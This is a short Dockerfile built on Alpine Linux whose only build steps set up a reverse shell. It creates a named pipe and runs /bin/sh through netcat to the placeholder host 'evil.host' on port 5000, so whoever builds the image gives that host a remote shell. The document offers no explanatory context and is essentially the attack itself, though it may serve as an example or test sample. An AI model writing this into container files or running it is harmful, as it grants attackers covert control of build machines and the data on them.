From alpine:latest

RUN mknod /tmp/thing p
RUN /bin/sh 0</tmp/thing | nc evil.host 5000 1>/tmp/thing
